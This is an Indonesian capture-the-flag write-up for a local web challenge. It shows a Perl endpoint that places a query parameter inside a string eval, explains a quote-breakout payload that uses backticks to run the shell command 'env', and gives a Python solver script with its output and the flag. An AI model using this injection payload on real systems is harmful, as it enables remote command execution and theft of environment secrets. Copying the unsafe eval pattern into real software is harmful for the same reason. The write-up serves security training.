# WriteUp: Rahasia Eko

## Overview

* **Judul:** Rahasia Eko
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Eko?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex9.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Eko]
└─$ tree
.
├── codex9.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex9.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex9:latest
    ports:
      - "1337:1337"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Eko]
└─$ PWN=WanZKey docker compose -f codex9.yml up -d --build
[+] up 10/10
 ✔ Image ghcr.io/hengkerrusia/codex9:latest Pulled
 ✔ Network rahasiaeko_default Created
 ✔ Container rahasiaeko-web-1 Created

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi ke dalam container. Ditemukan bahwa aplikasi berjalan menggunakan bahasa **Perl** (`app.pl`).

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Eko]
└─$ docker exec -u WanZKey rahasiaeko-web-1 cat app.pl
# ...
        } elsif ($path eq "/api/greet") {
            # Vulnerable Endpoint
            my $greeting = "Hello ";

            if ($name ne "") {
                # VULNERABILITY: Unsafe concatenation in eval
                # Input '$name' dimasukkan mentah-mentah ke dalam string eval
                $greeting = eval " '$greeting' . '$name' ";
            } else {
                $greeting .= "Guest";
            }
# ...

```

**Analisis Kerentanan:**

1. **Language:** Perl.
2. **Vulnerable Function:** `eval` (String form).
3. **Mechanism:**
* Kode server: `eval " '$greeting' . '$name' "`
* Input `$name` diambil dari parameter query string `name` dan hanya mengalami decode URL sederhana.
* Tidak ada sanitasi terhadap tanda kutip (`'`) atau karakter spesial shell.


4. **Exploit Strategy:**
* Input ditempatkan di dalam *single quotes*. Kita perlu melakukan *breakout*.
* Di Perl, tanda *backticks* (```) digunakan untuk mengeksekusi perintah shell (sama seperti `system` atau `qx//`).
* **Payload:** `'.`env`.'`
* **Hasil di Server:** `eval " 'Hello ' . ''.`env`.'' "`
* Server akan mengeksekusi `env` di shell, mengambil outputnya, dan menggabungkannya ke string `$greeting`.



### 3. Exploitation

Mengirimkan payload ke endpoint `/api/greet` melalui parameter `name` untuk mendump Environment Variable (flag).

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target Endpoint
URL = "http://localhost:1337/api/greet"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload Perl Injection
    # 1. '      -> Menutup string awal
    # 2. .      -> Operator konkatenasi Perl
    # 3. `env`  -> Backticks untuk eksekusi shell command (RCE)
    # 4. .      -> Sambung string lagi
    # 5. '      -> Membuka string penutup agar syntax valid
    payload = "'.`env`.'"
    
    print(f"[*] Sending Payload: {payload}")
    
    try:
        # Kirim GET request
        r = requests.get(URL, params={'name': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex Flag pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Eko]
└─$ python3 exploit.py
[*] Target: http://localhost:1337/api/greet
[*] Sending Payload: '.`env`.'
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{d8a064c912a391f3a138830a60bb0152}

```

## Flag

```
pwn{d8a064c912a391f3a138830a60bb0152}

```
